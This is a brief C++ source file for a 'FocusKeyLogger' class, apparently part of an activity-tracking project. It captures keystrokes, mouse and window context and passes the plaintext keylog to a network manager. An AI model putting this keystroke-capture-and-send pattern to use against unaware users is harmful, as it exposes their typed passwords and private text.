//
// Created by Etienne Pasteur on 17/10/2017.
//

#include <FocusKeyLogger.hpp>
#include "FocusKeyEventPayload.pb.h"
#include "FocusSerializer.hpp"

void FocusKeyLogger::Run() {
    _keyLoggerThread = std::make_unique<std::thread>(std::bind(&FocusKeyLogger::RunKeyLogger, this));
}

void FocusKeyLogger::RunKeyLogger() const {
    _eventListener->Register("OnWindowsContextChanged", [this](Focus::Event &newContext) {
        PushKeyLog(newContext);
    });

    _contextAgent->Run();
	_mouseListener->Run();
	_keyListener->Run(); //This will block current thread (on windows).
}

void FocusKeyLogger::PushKeyLog(const Focus::Event &context) const{
    _eventEmitter->Emit("FocusNetworkManager", context);

	Focus::KeyEventPayload keyPayload;
	keyPayload.set_plaintextkeylog(_keyListener->Flush());
	Focus::Event event = FocusSerializer::CreateEventFromContext("KeyPayload", keyPayload);
	_eventEmitter->Emit("FocusNetworkManager", event);
}
